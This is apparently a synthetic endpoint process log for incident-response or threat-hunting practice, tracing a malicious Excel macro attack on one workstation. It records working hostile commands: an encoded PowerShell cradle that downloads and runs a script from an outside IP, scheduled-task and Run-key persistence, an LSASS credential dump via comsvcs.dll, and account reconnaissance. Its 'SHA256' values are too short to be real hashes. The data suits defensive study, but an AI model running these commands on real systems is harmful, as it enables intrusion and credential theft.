Timestamp,DeviceName,DeviceId,ActionType,FileName,FolderPath,ProcessCommandLine,InitiatingProcessFileName,InitiatingProcessCommandLine,InitiatingProcessAccountName,SHA256
2026-07-20T08:58:03Z,DESKTOP-JS01,dev-js01-001,ProcessCreated,OUTLOOK.EXE,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,"OUTLOOK.EXE /recycle",explorer.exe,explorer.exe,jsmith,3f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a
2026-07-20T09:22:41Z,DESKTOP-JS01,dev-js01-001,ProcessCreated,EXCEL.EXE,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"EXCEL.EXE ""C:\Users\jsmith\Downloads\Invoice_8832.xlsm""",OUTLOOK.EXE,OUTLOOK.EXE,jsmith,4a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b
2026-07-20T09:22:58Z,DESKTOP-JS01,dev-js01-001,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3AC8AcwAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==",EXCEL.EXE,"EXCEL.EXE ""C:\Users\jsmith\Downloads\Invoice_8832.xlsm""",jsmith,5b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c
2026-07-20T09:23:47Z,DESKTOP-JS01,dev-js01-001,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -nop -w hidden -c IEX (IWR http://185.220.101.47/s/update.ps1 -UseBasicParsing)",powershell.exe,"powershell.exe -nop -w hidden -enc SQBFAFgA...",jsmith,5b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c
2026-07-20T09:25:12Z,DESKTOP-JS01,dev-js01-001,ProcessCreated,update_svc.exe,C:\Users\jsmith\AppData\Roaming\update_svc.exe,"update_svc.exe -install",powershell.exe,"powershell.exe -nop -w hidden -c IEX (IWR http://185.220.101.47/s/update.ps1 -UseBasicParsing)",jsmith,6c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
2026-07-20T09:25:33Z,DESKTOP-JS01,dev-js01-001,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,"schtasks.exe /create /tn ""MicrosoftUpdateHealth"" /tr ""C:\Users\jsmith\AppData\Roaming\update_svc.exe"" /sc onlogon /ru SYSTEM",update_svc.exe,"update_svc.exe -install",jsmith,6c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
2026-07-20T10:47:02Z,DESKTOP-JS01,dev-js01-001,ProcessCreated,rundll32.exe,C:\Windows\System32\rundll32.exe,"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 612 C:\Users\jsmith\AppData\Local\Temp\lsass.dmp full",update_svc.exe,"update_svc.exe -install",jsmith,7d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e
2026-07-20T11:03:41Z,FIN-SERVER01,dev-fin01-002,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,"cmd.exe /c whoami && net user",svchost.exe,svchost.exe,svc-backup,8e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f
2026-07-20T11:10:18Z,FIN-SERVER01,dev-fin01-002,ProcessCreated,mstsc.exe,C:\Windows\System32\mstsc.exe,"mstsc.exe /v:FIN-SERVER01",winlogon.exe,winlogon.exe,svc-backup,9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a
2026-07-19T13:11:02Z,DESKTOP-JS01,dev-js01-001,ProcessCreated,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,"chrome.exe",explorer.exe,explorer.exe,jsmith,0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b
2026-07-19T15:40:22Z,DESKTOP-TN04,dev-tn04-003,ProcessCreated,winword.exe,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"WINWORD.EXE ""C:\Users\tnguyen\Documents\Vendor_Agreement.docx""",explorer.exe,explorer.exe,tnguyen,1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c
2026-07-20T08:05:11Z,DESKTOP-KW02,dev-kw02-004,ProcessCreated,teams.exe,C:\Users\kwilliams\AppData\Local\Microsoft\Teams\current\Teams.exe,"Teams.exe",explorer.exe,explorer.exe,kwilliams,2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d
2026-07-20T09:00:45Z,DESKTOP-JS01,dev-js01-001,ProcessCreated,onedrive.exe,C:\Program Files\Microsoft OneDrive\OneDrive.exe,"OneDrive.exe /background",explorer.exe,explorer.exe,jsmith,3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e
2026-07-20T12:15:00Z,FIN-SERVER01,dev-fin01-002,ProcessCreated,notepad.exe,C:\Windows\System32\notepad.exe,"notepad.exe",explorer.exe,explorer.exe,fin-admin,4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f
2026-07-20T09:26:05Z,DESKTOP-JS01,dev-js01-001,ProcessCreated,reg.exe,C:\Windows\System32\reg.exe,"reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v UpdateHealth /t REG_SZ /d C:\Users\jsmith\AppData\Roaming\update_svc.exe /f",update_svc.exe,"update_svc.exe -install",jsmith,6c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
